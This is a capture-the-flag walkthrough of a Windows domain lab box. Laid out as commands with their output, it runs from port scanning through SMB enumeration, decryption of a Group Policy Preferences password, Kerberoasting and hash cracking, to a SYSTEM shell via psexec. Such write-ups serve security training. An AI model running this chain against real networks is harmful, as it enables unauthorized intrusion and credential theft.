
📌 Box Info
- **OS**: [Windows](Windows)
- **Difficulty**: [Easy](Easy)

## 🧭 Recon

### 🔍 Full TCP Port Scan
```bash
nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.100
```

### 🔍 Service Version and Script Scan
```bash
nmap -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152-49158,49169,49170,49179 -oA nmap/scripts 10.10.10.100
```

### 🔍 UDP Scan (for completeness)
```bash
nmap -sU -p- --min-rate 5000 -oA nmap/alludp 10.10.10.100
```

Key open ports included [Kerberos](KERBEROS), [SMB](SMB.md), [LDAP](LDAP.md), and [HTTP](HTTP).

---

## 📂 SMB Enumeration

### 🔎 Share Listing with smbmap
```bash
smbmap -H 10.10.10.100
```

### 🔎 Confirm access with enum4linux
```bash
enum4linux -a 10.10.10.100
```

---

## 📁 Replication Share - GPP Password

### 🗂️ Access the Replication share
```bash
smbclient //10.10.10.100/Replication -U ""%""
```

### 🧾 Locate GPP password in `Groups.xml`
```xml
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

### 🔐 Decrypt GPP password
```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
# Output: GPPstillStandingStrong2k18
```

---

## 👤 User Shell

### 🗂️ Enumerate users with access
```bash
smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
```

### 📥 Get `user.txt`
```bash
smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
smb: \SVC_TGS\desktop\> get user.txt
```

---

## 🔥 Kerberoasting

### 🎟️ Dump SPNs with Impacket
```bash
GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
```

### 🔓 Crack Ticket with Hashcat
```bash
hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force
# Output: Ticketmaster1968
```

---

## 🛠️ Administrator Access

### 🔓 Use cracked password to access shares
```bash
smbmap -H 10.10.10.100 -d active.htb -u administrator -p Ticketmaster1968
```

### 📥 Get `root.txt`
```bash
smbclient //10.10.10.100/C$ -U active.htb\\administrator%Ticketmaster1968
smb: \users\administrator\desktop\> get root.txt
```

---

## 🖥️ Shell as SYSTEM (Optional)

### 📦 Use psexec.py from Impacket
```bash
psexec.py active.htb/administrator@10.10.10.100
# Enter password: Ticketmaster1968
```

```cmd
whoami
# Output: nt authority\system
```